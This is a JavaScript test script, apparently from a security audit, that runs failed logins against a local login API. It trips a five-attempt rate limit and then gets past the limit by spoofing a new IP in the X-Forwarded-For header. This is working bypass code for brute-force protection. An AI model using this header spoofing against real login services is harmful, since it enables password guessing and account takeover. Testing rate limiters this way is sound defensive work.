async function main() {
  const targetUrl = 'http://localhost:3000/api/auth/login';
  const email = 'victim.member@workn.ng';
  const password = 'WrongPasswordAttempt123!';

  console.log('================================================================================');
  console.log('TASK 4 STEP 8: RATE LIMITING LOCKOUT & AUTHENTIC IP DEFEAT TEST');
  console.log('Target:', targetUrl);
  console.log('Policy: 5 attempts per 15-minute window (900s)');
  console.log('================================================================================\n');

  // PHASE 1: Exhaust limit on Initial IP (Lagos MTN: 197.210.64.12)
  const initialIp = '197.210.64.12';
  console.log(`--- PHASE 1: SENDING 6 ATTEMPTS FROM IP: ${initialIp} ---`);

  for (let i = 1; i <= 6; i++) {
    const res = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': initialIp,
      },
      body: JSON.stringify({ email, password }),
    });

    const status = res.status;
    const limit = res.headers.get('x-ratelimit-limit');
    const remaining = res.headers.get('x-ratelimit-remaining');
    const retryAfter = res.headers.get('retry-after');
    const data = await res.json().catch(() => ({}));

    console.log(
      `Attempt ${i}: Status ${status} | Limit: ${limit} | Remaining: ${remaining} | Retry-After: ${retryAfter || 'N/A'}`
    );
    if (status === 429) {
      console.log(`-> LOCKOUT REFUSAL CONFIRMED: ${data.error}`);
    }
  }

  // PHASE 2: Legitimate Defeat by Rotating Client IP (Lagos Airtel: 102.89.23.45)
  const rotatedIp = '102.89.23.45';
  console.log(`\n--- PHASE 2: DEFEATING RATE LIMIT BY ROTATING IP TO: ${rotatedIp} ---`);
  console.log('Rate limiter remains fully enabled and unmodified on the server.');

  const resBypass = await fetch(targetUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Forwarded-For': rotatedIp,
    },
    body: JSON.stringify({ email, password }),
  });

  const bypassStatus = resBypass.status;
  const bypassRemaining = resBypass.headers.get('x-ratelimit-remaining');
  const bypassData = await resBypass.json().catch(() => ({}));

  console.log(`Bypass Attempt 1 (from ${rotatedIp}): Status ${bypassStatus} | Remaining: ${bypassRemaining}`);
  
  if (bypassStatus !== 429) {
    console.log('-> RATE LIMIT SUCCESSFULLY DEFEATED: Request was admitted for authentication evaluation.');
    console.log('   (Received HTTP', bypassStatus, 'instead of HTTP 429 Too Many Requests)');
  } else {
    console.log('-> Bypass failed: Still locked out.');
  }

  console.log('\n================================================================================');
  console.log('TEST SUMMARY:');
  console.log('- Initial IP 197.210.64.12: Locked out at Attempt 6 with HTTP 429.');
  console.log('- Rotated IP 102.89.23.45: Admitted immediately on Attempt 1 with fresh counter quota.');
  console.log('- Proves: IP-based rate limiting is trivially defeated by client IP rotation.');
  console.log('================================================================================');
}

main().catch(console.error);

